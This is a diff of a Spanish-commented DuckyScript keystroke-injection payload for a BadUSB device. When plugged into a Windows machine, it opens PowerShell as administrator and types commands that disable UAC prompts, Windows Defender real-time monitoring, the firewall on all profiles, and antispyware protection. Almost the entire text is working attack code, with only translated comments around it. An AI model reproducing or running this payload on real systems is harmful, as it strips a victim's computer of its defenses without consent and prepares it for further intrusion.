@@ -43,29 +43,25 @@ DELAY 1000
 REM Salir de Seguridad de Windows
 ALT F4
 DELAY 3000
-REM Seguir aquí
+REM Vamos a por PowerShell como administrador
 GUI r
 DELAY 1000
-REM Open the Powershell as Administrator
 STRING powershell
 CTRL-SHIFT ENTER
 DELAY 2000
-ALT y
-ENTER
-DELAY 1000
-REM Disabling the UAC
+REM Deshabilitar UAC
 STRING Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
 ENTER
 DELAY 1000
-REM Disabling the Firewall Part 1
+REM Deshabilitar Firewall Parte 1
 STRING Set-MpPreference -DisableRealtimeMonitoring $true
 ENTER
 DELAY 1000
-REM Disabling the Firewall Part 2
+REM Deshabilitar Firewall Parte 2
 STRING Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 ENTER
 DELAY 1000
-REM Disabling the Virus and Threat Protection
+REM Deshabilitar protección Antivirus y Amenazas
 STRING New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
 ENTER
 DELAY 1000
